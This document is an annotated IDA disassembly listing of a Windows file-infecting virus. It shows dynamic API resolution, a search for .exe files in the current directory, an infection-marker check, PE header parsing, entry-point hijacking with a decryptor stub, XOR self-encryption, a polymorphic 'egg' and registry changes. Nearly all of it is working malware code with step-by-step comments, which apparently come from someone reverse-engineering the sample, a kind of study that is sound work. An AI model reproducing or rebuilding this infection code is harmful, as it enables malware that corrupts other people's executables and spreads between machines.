.text:00401645 46 69 6E 64 46 69 72 73 74+aFindfirstfilea db 'FindFirstFileA',0
.text:00401654 46 69 6E 64 4E 65 78 74 46+aFindnextfilea  db 'FindNextFileA',0
.text:00401662 46 69 6E 64 43 6C 6F 73 65+aFindclose      db 'FindClose',0
.text:0040166C 47 65 74 4C 61 73 74 45 72+aGetlasterror   db 'GetLastError',0
.text:00401679 45 78 69 74 50 72 6F 63 65+aExitprocess    db 'ExitProcess',0
.text:00401685 4C 6F 61 64 4C 69 62 72 61+aLoadlibrarya   db 'LoadLibraryA',0
.text:00401692 46 72 65 65 4C 69 62 72 61+aFreelibrary    db 'FreeLibrary',0
.text:0040169E 45 78 70 61 6E 64 45 6E 76+aExpandenvironm db 'ExpandEnvironmentStringsA',0
.text:004016B8 47 65 74 4D 6F 64 75 6C 65+aGetmodulefilen db 'GetModuleFileNameA',0
.text:004016CB 43 6F 70 79 46 69 6C 65 41+aCopyfilea      db 'CopyFileA',0
.text:004016D5 47 65 74 43 75 72 72 65 6E+aGetcurrentdire db 'GetCurrentDirectoryA',0
.text:004016EA 53 65 74 43 75 72 72 65 6E+aSetcurrentdire db 'SetCurrentDirectoryA',0
.text:004016FF 47 65 74 46 69 6C 65 41 74+aGetfileattribu db 'GetFileAttributesA',0
.text:00401712 47 65 74 54 69 63 6B 43 6F+aGettickcount   db 'GetTickCount',0
.text:0040171F 57 69 6E 45 78 65 63 00    aWinexec        db 'WinExec',0
.text:00401727 FF                                         db 0FFh
.text:00401728 00 00 00                                   db 3 dup(0)
.text:0040172B 00 00 00 00                AddrGetLogicaldrive dd 0                ; DATA XREF: jumpToCode+5\u2193o
.text:0040172B                                                                    ; payload4\u2193r
.text:0040172F 00 00 00 00                CreateFile      dd 0                    ; DATA XREF: nfkt_this+19C\u2193r
.text:0040172F                                                                    ; dropAndInfect+5F\u2193r
.text:00401733 00 00 00 00                dword_401733    dd 0                    ; DATA XREF: dropAndInfect+7E\u2193r
.text:00401737                            ; BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)
.text:00401737 00 00 00 00                WriteFile       dd 0                    ; DATA XREF: nfkt_this+2CF\u2193r
.text:00401737                                                                    ; dropAndInfect+77\u2193r
.text:0040173B                            ; BOOL __stdcall ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped)
.text:0040173B 00 00 00 00                ReadFile        dd 0                    ; DATA XREF: nfkt_this+1FA\u2193r
.text:0040173F 00 00 00 00                BeginUpdateFunction dd 0                ; DATA XREF: nfkt_this+144\u2193r
.text:00401743 00 00 00 00                UpdateResource  dd 0                    ; DATA XREF: nfkt_this+168\u2193r
.text:00401747 00 00 00 00                EndUpdateResource dd 0                  ; DATA XREF: nfkt_this+17A\u2193r
.text:0040174B 00 00 00 00                addr_find_resource dd 0                 ; DATA XREF: nfkt_this+2D\u2193r
.text:0040174F                            ; DWORD __stdcall GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh)
.text:0040174F 00 00 00 00                GetFileSize     dd 0                    ; DATA XREF: nfkt_this+1B3\u2193r
.text:00401753                            ; HGLOBAL __stdcall GlobalAlloc(UINT uFlags, SIZE_T dwBytes)
.text:00401753 00 00 00 00                GlobalAlloc     dd 0                    ; DATA XREF: nfkt_exe+8\u2193r
.text:00401753                                                                    ; nfkt_this+E7\u2193r ...
.text:00401757                            ; DWORD __stdcall SetFilePointer(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod)
.text:00401757 00 00 00 00                SetFilePointer  dd 0                    ; DATA XREF: nfkt_this+2AD\u2193r
.text:0040175B 00                                         align 4
.text:0040175C 00 00 00                                   db 3 dup(0)
.text:0040175F 00 00 00 00                GetDateFormatF  dd 0                    ; DATA XREF: payload2+15\u2193r
.text:00401763 00 00 00 00                dword_401763    dd 0                    ; DATA XREF: payload2+61\u2193r
.text:00401767 00 00 00 00                FindFirstFile   dd 0                    ; DATA XREF: nfkt_exe+2A\u2193r
.text:0040176B 00 00 00 00                FindNextFile    dd 0                    ; DATA XREF: nfkt_exe+73\u2193r
.text:0040176F 00 00 00 00                CloseFile       dd 0                    ; DATA XREF: nfkt_exe+B4\u2193r
.text:00401773                            ; DWORD __stdcall GetLastError()
.text:00401773 00 00 00 00                GetLastError    dd 0                    ; DATA XREF: nfkt_exe+79\u2193r
.text:00401777 00 00 00 00                ExitProcessF    dd 0                    ; DATA XREF: find_main_api-85\u2191r
.text:0040177B 00 00 00 00                AddrLoadLibrary dd 0                    ; DATA XREF: getting_messagebox_api+7\u2191r
.text:0040177B                                                                    ; jumpToCode+27\u2193r ...
.text:0040177F 00 00 00 00                FreeLibraryf    dd 0                    ; DATA XREF: nfkt_this+DA\u2193r
.text:00401783 00                                         align 4
.text:00401784 00 00 00                                   db 3 dup(0)
.text:00401787 00 00 00 00                GetModuleFileName dd 0                  ; DATA XREF: getName+20\u2193r
.text:0040178B 00 00 00 00                CopyFileF       dd 0                    ; DATA XREF: payload3+14\u2193r
.text:0040178B                                                                    ; dropAndInfect+45\u2193r
.text:0040178F 00 00 00 00                GetCurrentDirectoryF dd 0               ; DATA XREF: dropAndInfect+1E\u2193r
.text:00401793 00 00 00 00                SetCurrentDirectory dd 0                ; DATA XREF: dropAndInfect+2B\u2193r
.text:00401793                                                                    ; dropAndInfect+8A\u2193r
.text:00401797 00                                         align 4
.text:00401798 00 00 00                                   db 3 dup(0)
.text:0040179B                            ; DWORD __stdcall GetTickCount()
.text:0040179B 00 00 00 00                GetTickCount    dd 0                    ; DATA XREF: rand+2\u2193r
.text:0040179F                            ; UINT __stdcall WinExec(LPCSTR lpCmdLine, UINT uCmdShow)
.text:0040179F 00 00 00 00                WinExec         dd 0                    ; DATA XREF: payload2+70\u2193r
.text:0040179F                                                                    ; run_explorer+3F\u2193r
.text:004017A3 FF                                         db 0FFh
.text:004017A4 00 00 00                                   db 3 dup(0)
.text:004017A7 52 65 67 4F 70 65 6E 4B 65+aRegopenkeyexa  db 'RegOpenKeyExA',0    ; DATA XREF: jumpToCode+3B\u2193o
.text:004017B5 52 65 67 51 75 65 72 79 56+aRegqueryvaluee db 'RegQueryValueExA',0
.text:004017C6 52 65 67 53 65 74 56 61 6C+aRegsetvalueexa db 'RegSetValueExA',0
.text:004017D5 52 65 67 43 6C 6F 73 65 4B+aRegclosekey    db 'RegCloseKey',0
.text:004017E1 FF 00 00                                   db 0FFh, 2 dup(0)
.text:004017E4 00                                         db 0
.text:004017E5                            ; LSTATUS __stdcall RegOpenKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult)
.text:004017E5 00 00 00 00                RegOpenKeyExA   dd 0                    ; DATA XREF: jumpToCode+40\u2193o
.text:004017E5                                                                    ; fix_vista+17\u2193r
.text:004017E9 00 00 00                                   align 4
.text:004017EC 00                                         db 0
.text:004017ED                            ; LSTATUS __stdcall RegSetValueExA(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult)
.text:004017ED 00 00 00 00                RegSetValueExA  dd 0                    ; DATA XREF: fix_vista+44\u2193r
.text:004017F1                            ; LSTATUS __stdcall RegCloseKey(HKEY hKey)
.text:004017F1 00 00 00 00                RegCloseKey     dd 0                    ; DATA XREF: fix_vista+50\u2193r
.text:004017F5 FF 00 00                                   db 0FFh, 2 dup(0)
.text:004017F8 00                                         db 0
.text:004017F9 49 73 55 73 65 72 41 6E 41+aIsuseranadmin  db 'IsUserAnAdmin',0    ; DATA XREF: jumpToCode+69\u2193o
.text:00401807 FF                                         db 0FFh
.text:00401808 00 00 00                                   db 3 dup(0)
.text:0040180B                            ; BOOL __stdcall IsUserAnAdmin()
.text:0040180B 00 00 00 00                IsUserAnAdmin   dd 0                    ; DATA XREF: jumpToCode+6F\u2193o
.text:0040180B                                                                    ; payload1\u2193r
.text:0040180F FF                                         db 0FFh
.text:00401810 00 00 00                                   db 3 dup(0)
.text:00401813
.text:00401813                            ; =============== S U B R O U T I N E =======================================
.text:00401813
.text:00401813
.text:00401813                            jumpToCode      proc near               ; CODE XREF: find_other_apis\u2191j
.text:00401813
.text:00401813                            ; FUNCTION CHUNK AT .text:0040138D SIZE 0000003F BYTES
.text:00401813
.text:00401813 BE 79 15 40 00                             mov     esi, offset aGetlogicaldriv ; esi = offset to 'GetLogicalDrive'
.text:00401818 BF 2B 17 40 00                             mov     edi, offset AddrGetLogicaldrive ; edi = destination
.text:0040181D 03 F5                                      add     esi, ebp        ; adding the ebp to make it non-relative addr
.text:0040181F 03 FD                                      add     edi, ebp        ; same here
.text:00401821 FF B5 EA 13 40 00                          push    ss:Kernel32Base[ebp] ; Save kernelbase
.text:00401827 8F 85 54 15 40 00                          pop     ss:dll_base[ebp] ; save kernelbase at that location in memory as a dll param for the api call
.text:0040182D E8 5C 00 00 00                             call    loop_API        ; Call this func to get all the apis and asave them at the edi
.text:00401832 B8 58 15 40 00                             mov     eax, offset aAdvapi32Dll ; grab the offset of that string
.text:00401837 03 C5                                      add     eax, ebp        ; make the address non relative
.text:00401839 50                                         push    eax             ; push it as a aargument
.text:0040183A FF 95 7B 17 40 00                          call    ss:AddrLoadLibrary[ebp] ; call load library to load Advapi32DLL
.text:00401840 0B C0                                      or      eax, eax        ; check if error
.text:00401842 0F 84 45 FB FF FF                          jz      Exit            ; exit if error
.text:00401848 89 85 54 15 40 00                          mov     ss:dll_base[ebp], eax ; store the dll as a param for the loop_API
.text:0040184E BE A7 17 40 00                             mov     esi, offset aRegopenkeyexa ; Get the offset of the beggining of the function list for this dll
.text:00401853 BF E5 17 40 00                             mov     edi, offset RegOpenKeyExA ; destination for saving
.text:00401858 03 F5                                      add     esi, ebp        ; make the address non relative
.text:0040185A 03 FD                                      add     edi, ebp        ; make the address non relative
.text:0040185C E8 2D 00 00 00                             call    loop_API        ; call loop_API
.text:00401861 8D 85 69 15 40 00                          lea     eax, aShell32Dll[ebp] ; eax = addr of Shell32DLL string
.text:00401867 50                                         push    eax             ; push it as a param
.text:00401868 FF 95 7B 17 40 00                          call    ss:AddrLoadLibrary[ebp] ; call LoadLibrary
.text:0040186E 0B C0                                      or      eax, eax        ; check if error
.text:00401870 0F 84 17 FB FF FF                          jz      Exit            ; exit if error
.text:00401876 89 85 54 15 40 00                          mov     ss:dll_base[ebp], eax ; store the dll as a param for the loop_API
.text:0040187C 8D B5 F9 17 40 00                          lea     esi, aIsuseranadmin[ebp] ; Get the addr of the beggining of the function list for this dll
.text:00401882 8D BD 0B 18 40 00                          lea     edi, IsUserAnAdmin[ebp] ; destination for saving
.text:00401888 E8 01 00 00 00                             call    loop_API        ; call loop_API
.text:0040188D C3                                         retn
.text:0040188D                            jumpToCode      endp ; sp-analysis failed
.text:0040188D
.text:0040188E
.text:0040188E                            ; =============== S U B R O U T I N E =======================================
.text:0040188E
.text:0040188E
.text:0040188E                            loop_API        proc near               ; CODE XREF: jumpToCode+1A\u2191p
.text:0040188E                                                                    ; jumpToCode+49\u2191p ...
.text:0040188E
.text:0040188E                            ; FUNCTION CHUNK AT .text:0040138D SIZE 0000003F BYTES
.text:0040188E
.text:0040188E 8B C6                                      mov     eax, esi        ; eax = esi pointer to name of the function
.text:00401890 50                                         push    eax             ; save it as an argument
.text:00401891 FF B5 54 15 40 00                          push    ss:dll_base[ebp] ; dll as an argument for the process (GetProc)
.text:00401897 FF 95 49 14 40 00                          call    ss:GetProcAddress[ebp] ; Call GetProcAddr
.text:0040189D 0B C0                                      or      eax, eax        ; if error exit
.text:0040189F 0F 84 E8 FA FF FF                          jz      Exit            ; exit
.text:004018A5 89 07                                      mov     [edi], eax      ; Othervise, write the address of the function to the destiation (edi)
.text:004018A7
.text:004018A7                            loop_small:                             ; CODE XREF: loop_API+1D\u2193j
.text:004018A7 46                                         inc     esi             ; incremeant esi to get to the next letter in the function name
.text:004018A8 80 3E 00                                   cmp     byte ptr [esi], 0 ; if 0 then we are at the end, so keep going to the next function
.text:004018AB 75 FA                                      jnz     short loop_small ; continue
.text:004018AD 46                                         inc     esi             ; next letter
.text:004018AE 83 C7 04                                   add     edi, 4          ; push edi by 4 byte to be able to save next addr
.text:004018B1 81 3F FF 00 00 00                          cmp     dword ptr [edi], 0FFh ; checks if it's the end of all the api strings
.text:004018B7 74 02                                      jz      short locret_4018BB ; If that's the case return
.text:004018B9 EB D3                                      jmp     short loop_API  ; else keep looping
.text:004018BB                            ; ---------------------------------------------------------------------------
.text:004018BB
.text:004018BB                            locret_4018BB:                          ; CODE XREF: loop_API+29\u2191j
.text:004018BB C3                                         retn
.text:004018BB                            loop_API        endp ; sp-analysis failed
.text:004018BB
.text:004018BC                            ; ---------------------------------------------------------------------------
.text:004018BC
.text:004018BC                            decrypt1234:                            ; DATA XREF: fixEnteryPoint+3B\u2193o
.text:004018BC 50                                         push    eax             ; eax = offset to encrypted code location
.text:004018BD E8 04 00 00 00                             call    decrypt123      ; call decrypt123
.text:004018BD                            ; ---------------------------------------------------------------------------
.text:004018C2 FF                         unk_4018C2      db 0FFh ; ÿ             ; DATA XREF: start+304\u2191w
.text:004018C2                                                                    ; encrypt_2+5\u2193r ...
.text:004018C3 00                                         db    0
.text:004018C4 00                                         db    0
.text:004018C5 00                                         db    0
.text:004018C6
.text:004018C6                            ; =============== S U B R O U T I N E =======================================
.text:004018C6
.text:004018C6
.text:004018C6                            decrypt123      proc near               ; CODE XREF: .text:004018BD\u2191p
.text:004018C6 90                                         nop
.text:004018C6                            decrypt123      endp
.text:004018C6
.text:004018C6                            ; ---------------------------------------------------------------------------
.text:004018C7 90                         egg             db  90h                 ; DATA XREF: polyizer+14\u2193o
.text:004018C7                                                                    ; .text:00402644\u2193o
.text:004018C8 90 90 90 90 90 90 90 90 90+                db 13Fh dup(90h)
.text:00401A07
.text:00401A07                            ; =============== S U B R O U T I N E =======================================
.text:00401A07
.text:00401A07
.text:00401A07                            encrypt_2       proc near               ; CODE XREF: nfkt_this+27D\u2193p
.text:00401A07 B9 20 17 00 00                             mov     ecx, 1720h      ; ecx = size of virus
.text:00401A0C 8B 85 C2 18 40 00                          mov     eax, dword ptr ss:unk_4018C2[ebp] ; eax = 0FF
.text:00401A12
.text:00401A12                            noNameLoop:                             ; CODE XREF: encrypt_2+E\u2193j
.text:00401A12 31 06                                      xor     [esi], eax      ; xor virus code byte (pointed to by esi) and 0FF and store it.
.text:00401A14 46                                         inc     esi             ; move to the next byte
.text:00401A15 E2 FB                                      loop    noNameLoop      ; keep xor ing
.text:00401A17 C3                                         retn                    ; return
.text:00401A17                            encrypt_2       endp
.text:00401A17
.text:00401A18                            ; ---------------------------------------------------------------------------
.text:00401A18 EB 40                                      jmp     short nfkt_exe
.text:00401A18                            ; ---------------------------------------------------------------------------
.text:00401A1A 00 00 00 00                v_file          dd 0                    ; DATA XREF: nfkt_this\u2193w
.text:00401A1A                                                                    ; nfkt_this+6\u2193r ...
.text:00401A1E 00 00 00 00                image_base      dd 0                    ; DATA XREF: start+2BA\u2191r
.text:00401A1E                                                                    ; nfkt_this+6D\u2193w
.text:00401A22 00 00 00 00                old_eip         dd 0                    ; DATA XREF: start+2B4\u2191r
.text:00401A22                                                                    ; find_first_section+2\u2193r ...
.text:00401A26 00 00 00 00                firstSectionOffset dd 0                 ; DATA XREF: nfkt_this+242\u2193w
.text:00401A26                                                                    ; nfkt_this+296\u2193r
.text:00401A2A 00 00 00 00                virus_fh        dd 0                    ; DATA XREF: nfkt_this+1AA\u2193w
.text:00401A2A                                                                    ; nfkt_this+1F4\u2193r ...
.text:00401A2E 00 00 00 00                v_mem           dd 0                    ; DATA XREF: fixEnteryPoint+10\u2193r
.text:00401A2E                                                                    ; nfkt_this+F5\u2193w ...
.text:00401A32                            ; HGLOBAL __stdcall offset_vsize(UINT uFlags, SIZE_T dwBytes)
.text:00401A32 00 00 00 00                offset_vsize    dd 0                    ; DATA XREF: nfkt_this+1C1\u2193w
.text:00401A32                                                                    ; nfkt_this+1E8\u2193r ...
.text:00401A36 00 00 00 00                v_file_ll_handle dd 0                   ; DATA XREF: nfkt_this+1A\u2193w
.text:00401A36                                                                    ; nfkt_this+27\u2193r ...
.text:00401A3A 00 00 00 00                find_data       dd 0                    ; DATA XREF: nfkt_exe+16\u2193w
.text:00401A3A                                                                    ; nfkt_exe+1C\u2193r ...
.text:00401A3E 2A 2E                      word_401A3E     dw '.*'                 ; DATA XREF: nfkt_exe+22\u2193o
.text:00401A40 2A 00                                      db '*', 0
.text:00401A42 00 00 00 00                search_handle   dd 0                    ; DATA XREF: nfkt_exe+39\u2193w
.text:00401A42                                                                    ; nfkt_exe+6D\u2193r ...
.text:00401A46 00 00                                      align 4
.text:00401A48 00 00 2A 2E 2A 00 00 00 00+                dd 2E2A0000h, 2Ah, 0
.text:00401A54 00 00                                      db 2 dup(0)
.text:00401A56 00 00 00 00                virus_enteryPoint dd 0                  ; DATA XREF: fixEnteryPoint+2C\u2193r
.text:00401A56                                                                    ; nfkt_this+290\u2193w
.text:00401A5A
.text:00401A5A                            ; =============== S U B R O U T I N E =======================================
.text:00401A5A
.text:00401A5A
.text:00401A5A                            nfkt_exe        proc near               ; CODE XREF: start+30A\u2191p
.text:00401A5A                                                                    ; .text:00401A18\u2191j ...
.text:00401A5A B8 3E 01 00 00                             mov     eax, 13Eh       ; eax = 13E size of Win32 data structure
.text:00401A5F 50                                         push    eax             ; dwBytes
.text:00401A60 6A 00                                      push    0               ; uFlags
.text:00401A62 FF 95 53 17 40 00                          call    ss:GlobalAlloc[ebp] ; allocate space for the find data structure
.text:00401A68 0B C0                                      or      eax, eax        ; check is failed
.text:00401A6A 0F 84 A4 00 00 00                          jz      exitInfect      ; exit if failed
.text:00401A70 89 85 3A 1A 40 00                          mov     ss:find_data[ebp], eax ; save that pointer to memory
.text:00401A76 FF B5 3A 1A 40 00                          push    ss:find_data[ebp] ; save the pointer to stack
.text:00401A7C B8 3E 1A 40 00                             mov     eax, offset word_401A3E ; serch for "*.*" pretty much all the files
.text:00401A81 03 C5                                      add     eax, ebp        ; make it non relative pointer
.text:00401A83 50                                         push    eax             ; put it as an arg onto stack (name)
.text:00401A84 FF 95 67 17 40 00                          call    ss:FindFirstFile[ebp] ; call findFirstFile
.text:00401A8A 83 F8 FF                                   cmp     eax, 0FFFFFFFFh ; cehck if error
.text:00401A8D 0F 84 81 00 00 00                          jz      exitInfect      ; exit if error
.text:00401A93 89 85 42 1A 40 00                          mov     ss:search_handle[ebp], eax ; save search handel to memory
.text:00401A99 8B 85 3A 1A 40 00                          mov     eax, ss:find_data[ebp] ; grab first byte of find data structure
.text:00401A9F 83 C0 2C                                   add     eax, 2Ch ; ','  ; offsets the file name within find data structure
.text:00401AA2 8B F0                                      mov     esi, eax        ; move it to source
.text:00401AA4 E8 91 09 00 00                             call    size_string     ; find the string length
.text:00401AA9 8B F0                                      mov     esi, eax        ; esi points to beg of the string
.text:00401AAB 03 F1                                      add     esi, ecx        ; add the size of the string, go to the end of the string
.text:00401AAD 83 EE 04                                   sub     esi, 4          ; move back 4 bytes for the .exe check
.text:00401AB0 8B 16                                      mov     edx, [esi]      ; grab file extension
.text:00401AB2 81 F2 2E 65 78 65                          xor     edx, 'exe.'     ; compare to .exe
.text:00401AB8 0B D2                                      or      edx, edx        ; check if the same
.text:00401ABA 75 05                                      jnz     short find_next ; if it's not 0 jump, it's not an exe file
.text:00401ABC E8 CB 00 00 00                             call    nfkt_this       ; Else, infect that boy
.text:00401AC1
.text:00401AC1                            find_next:                              ; CODE XREF: nfkt_exe+60\u2191j
.text:00401AC1                                                                    ; nfkt_exe+A5\u2193j ...
.text:00401AC1 FF B5 3A 1A 40 00                          push    ss:find_data[ebp] ; push the find data structure onto the stack
.text:00401AC7 FF B5 42 1A 40 00                          push    ss:search_handle[ebp] ; grab search handle for next file
.text:00401ACD FF 95 6B 17 40 00                          call    ss:FindNextFile[ebp] ; call FindNextFile
.text:00401AD3 FF 95 73 17 40 00                          call    ss:GetLastError[ebp] ; grab the last Error
.text:00401AD9 83 F8 12                                   cmp     eax, 12h        ; if the error is 12h, there are no more files
.text:00401ADC 74 2A                                      jz      short noMoreFiles ; if no more take the jump
.text:00401ADE 8B 85 3A 1A 40 00                          mov     eax, ss:find_data[ebp] ; grabs the structure
.text:00401AE4 83 C0 2C                                   add     eax, 2Ch ; ','  ; offsets the file name within find data structure
.text:00401AE7 8B F0                                      mov     esi, eax        ; move it to source
.text:00401AE9 E8 4C 09 00 00                             call    size_string     ; find the string length
.text:00401AEE 8B F0                                      mov     esi, eax        ; esi points to beg of the string
.text:00401AF0 03 F1                                      add     esi, ecx        ; add the size of the string, go to the end of the string
.text:00401AF2 83 EE 04                                   sub     esi, 4          ; move back 4 bytes for the .exe check
.text:00401AF5 8B 16                                      mov     edx, [esi]      ; grab file extension
.text:00401AF7 81 F2 2E 65 78 65                          xor     edx, 'exe.'     ; compare to .exe
.text:00401AFD 0B D2                                      or      edx, edx        ; check if same
.text:00401AFF 75 C0                                      jnz     short find_next ; if it's not 0 jump, it's not an exe file
.text:00401B01 E8 86 00 00 00                             call    nfkt_this       ; else, infect that boy
.text:00401B06 EB B9                                      jmp     short find_next ; othervise, loop to find next
.text:00401B08                            ; ---------------------------------------------------------------------------
.text:00401B08
.text:00401B08                            noMoreFiles:                            ; CODE XREF: nfkt_exe+82\u2191j
.text:00401B08 FF B5 42 1A 40 00                          push    ss:search_handle[ebp] ; grab search handle
.text:00401B0E FF 95 6F 17 40 00                          call    ss:CloseFile[ebp] ; call close file
.text:00401B14
.text:00401B14                            exitInfect:                             ; CODE XREF: nfkt_exe+10\u2191j
.text:00401B14                                                                    ; nfkt_exe+33\u2191j
.text:00401B14 C3                                         retn
.text:00401B14                            nfkt_exe        endp
.text:00401B14
.text:00401B15
.text:00401B15                            ; =============== S U B R O U T I N E =======================================
.text:00401B15
.text:00401B15                            ; store ebx
.text:00401B15
.text:00401B15                            find_first_section proc near            ; CODE XREF: nfkt_this+23D\u2193p
.text:00401B15 53                                         push    ebx             ; store ebx
.text:00401B16 52                                         push    edx             ; store edx
.text:00401B17 8B 9D 22 1A 40 00                          mov     ebx, ss:old_eip[ebp] ; grab old entry point
.text:00401B1D
.text:00401B1D                            loc_401B1D:                             ; CODE XREF: find_first_section+14\u2193j
.text:00401B1D                                                                    ; find_first_section+20\u2193j
.text:00401B1D 33 C0                                      xor     eax, eax        ; zero out eax
.text:00401B1F 8B 42 0C                                   mov     eax, [edx+0Ch]  ; grabbing the virtual address of the image section header
.text:00401B22 3B C3                                      cmp     eax, ebx        ; compare the virtual address with the entry point
.text:00401B24 7E 05                                      jle     short loc_401B2B ; if virtual address < entry point, jump
.text:00401B26 83 C2 28                                   add     edx, 28h ; '('  ; otherwise, go to next section header
.text:00401B29 EB F2                                      jmp     short loc_401B1D ; loop and inspect next section
.text:00401B2B                            ; ---------------------------------------------------------------------------
.text:00401B2B
.text:00401B2B                            loc_401B2B:                             ; CODE XREF: find_first_section+F\u2191j
.text:00401B2B 03 42 10                                   add     eax, [edx+10h]  ; grab the size of the raw data
.text:00401B2E 3B C3                                      cmp     eax, ebx        ; if the raw data + VA > entry point, then we found the memory location
.text:00401B30 7F 05                                      jg      short loc_401B37 ; jump to process
.text:00401B32 83 C2 28                                   add     edx, 28h ; '('  ; otherwise, go to the next section header
.text:00401B35 EB E6                                      jmp     short loc_401B1D ; and process it
.text:00401B37                            ; ---------------------------------------------------------------------------
.text:00401B37
.text:00401B37                            loc_401B37:                             ; CODE XREF: find_first_section+1B\u2191j
.text:00401B37 92                                         xchg    eax, edx        ; eax = section header of memory point
.text:00401B38 5A                                         pop     edx             ; restore
.text:00401B39 5B                                         pop     ebx             ; restore
.text:00401B3A C3                                         retn                    ; return
.text:00401B3A                            find_first_section endp
.text:00401B3A
.text:00401B3B
.text:00401B3B                            ; =============== S U B R O U T I N E =======================================
.text:00401B3B
.text:00401B3B
.text:00401B3B                            fixEnteryPoint  proc near               ; CODE XREF: nfkt_this+29C\u2193p
.text:00401B3B
.text:00401B3B                            var_4           = dword ptr -4
.text:00401B3B
.text:00401B3B C7 40 24 40 00 00 C0                       mov     dword ptr [eax+24h], 0C0000040h ; Changes the characteristics of the image
.text:00401B42 8B 95 22 1A 40 00                          mov     edx, ss:old_eip[ebp] ; edx = old entery point
.text:00401B48 2B 50 0C                                   sub     edx, [eax+0Ch]  ; edx = offset to the entery point
.text:00401B4B 8B 8D 2E 1A 40 00                          mov     ecx, ss:v_mem[ebp] ; ecx = pointer to allocated mem
.text:00401B51 03 48 14                                   add     ecx, [eax+14h]  ; ecx += pointer to raw data
.text:00401B54 03 CA                                      add     ecx, edx        ; ecx = entery point to the virus in the copied file that sits in memory
.text:00401B56 8D BD 77 10 40 00                          lea     edi, dump_bytes[ebp] ; edi = pointer to dump_bytes in memory
.text:00401B5C 87 F1                                      xchg    esi, ecx        ; esi = the entery point
.text:00401B5E 8B 8D C2 18 40 00                          mov     ecx, dword ptr ss:unk_4018C2[ebp] ; ecx = 0FF
.text:00401B64 C6 06 B8                                   mov     byte ptr [esi], 0B8h ; '¸' ; storing 0B8h to the begginng of entery point
.text:00401B67 FF B5 56 1A 40 00                          push    ss:virus_enteryPoint[ebp] ; put the virus entery point on the stack
.text:00401B6D 31 0C 24                                   xor     [esp+4+var_4], ecx ; xor the virus first byte with 0FF
.text:00401B70 8F 46 01                                   pop     dword ptr [esi+1] ; store that value at esi +1 which is below the entery point
.text:00401B73 83 C6 05                                   add     esi, 5          ; esi += 5 to jump after address insertion
.text:00401B76 8D BD BC 18 40 00                          lea     edi, decrypt1234[ebp] ; edi = pointer to decrypt1234
.text:00401B7C 87 FE                                      xchg    edi, esi        ; swap
.text:00401B7E B9 4B 01 00 00                             mov     ecx, 14Bh       ; ecx = 14B (the egg size + decrypt1234 stub)
.text:00401B83 F3 A4                                      rep movsb               ; copy egg into file sitting in memory
.text:00401B85 C3                                         retn                    ; return
.text:00401B85                            fixEnteryPoint  endp
.text:00401B85
.text:00401B86                            ; ---------------------------------------------------------------------------
.text:00401B86                            ; START OF FUNCTION CHUNK FOR nfkt_this
.text:00401B86
.text:00401B86                            exit_section_crawl:                     ; CODE XREF: nfkt_this+AA\u2193j
.text:00401B86                                                                    ; nfkt_this+C4\u2193j ...
.text:00401B86 61                                         popa                    ; restore
.text:00401B87 E9 D6 02 00 00                             jmp     exit_infect     ; exit infect func
.text:00401B87                            ; END OF FUNCTION CHUNK FOR nfkt_this
.text:00401B8C
.text:00401B8C                            ; =============== S U B R O U T I N E =======================================
.text:00401B8C
.text:00401B8C                            ; saves that file? to memory
.text:00401B8C
.text:00401B8C                            nfkt_this       proc near               ; CODE XREF: start+2F4\u2191p
.text:00401B8C                                                                    ; nfkt_exe+62\u2191p ...
.text:00401B8C
.text:00401B8C                            ; FUNCTION CHUNK AT .text:0040138D SIZE 0000003F BYTES
.text:00401B8C                            ; FUNCTION CHUNK AT .text:00401B86 SIZE 00000006 BYTES
.text:00401B8C
.text:00401B8C 89 85 1A 1A 40 00                          mov     ss:v_file[ebp], eax ; saving that file to memory
.text:00401B92 FF B5 1A 1A 40 00                          push    ss:v_file[ebp]  ; pushes that file from memory to the stack
.text:00401B98 FF 95 7B 17 40 00                          call    ss:AddrLoadLibrary[ebp] ; loading that file, returning the handle
.text:00401B9E 0B C0                                      or      eax, eax        ; checking if it worked
.text:00401BA0 0F 84 BC 02 00 00                          jz      exit_infect     ; exit infect if failed
.text:00401BA6 89 85 36 1A 40 00                          mov     ss:v_file_ll_handle[ebp], eax ; save the handle to memory
.text:00401BAC 6A 0A                                      push    0Ah             ; Find Resource -  type = RT_RCDATA (app defined resource)
.text:00401BAE 68 D2 04 00 00                             push    1234            ; Find resource 1234 (integer ID)
.text:00401BB3 FF B5 36 1A 40 00                          push    ss:v_file_ll_handle[ebp] ; push file to inspect onto stack as argument
.text:00401BB9 FF 95 4B 17 40 00                          call    ss:addr_find_resource[ebp] ; Call FindResource(), make sure that 1234 exists
.text:00401BBF 0B C0                                      or      eax, eax        ; check if failed
.text:00401BC1 0F 85 9B 02 00 00                          jnz     exit_infect     ; exit infect if 1234 is found
.text:00401BC7 8B B5 36 1A 40 00                          mov     esi, ss:v_file_ll_handle[ebp] ; copy the file handle to esi
.text:00401BCD 66 81 3E 4D 5A                             cmp     word ptr [esi], 'ZM' ; look for MZ magic header at top of file
.text:00401BD2 0F 85 8A 02 00 00                          jnz     exit_infect     ; exit infect if failed
.text:00401BD8 03 76 3C                                   add     esi, [esi+3Ch]  ; check image NT header == "PE"
.text:00401BDB 66 81 3E 50 45                             cmp     word ptr [esi], 'EP' ; if not equal, quit
.text:00401BE0 0F 85 7C 02 00 00                          jnz     exit_infect     ; exit infect if failed
.text:00401BE6 83 BE 88 00 00 00 00                       cmp     dword ptr [esi+88h], 0 ; Check if VA of Entry Resource is 0
.text:00401BED 0F 84 6F 02 00 00                          jz      exit_infect     ; exit infect if it is
.text:00401BF3 8B 46 28                                   mov     eax, [esi+28h]  ; grab address of entry point
.text:00401BF6 8B 5E 34                                   mov     ebx, [esi+34h]  ; grab image base from NT header
.text:00401BF9 89 9D 1E 1A 40 00                          mov     ss:image_base[ebp], ebx ; store image base
.text:00401BFF 89 85 22 1A 40 00                          mov     ss:old_eip[ebp], eax ; store EIP
.text:00401C05 57                                         push    edi             ; store edi
.text:00401C06 8B F8                                      mov     edi, eax        ; store the entry point into edi
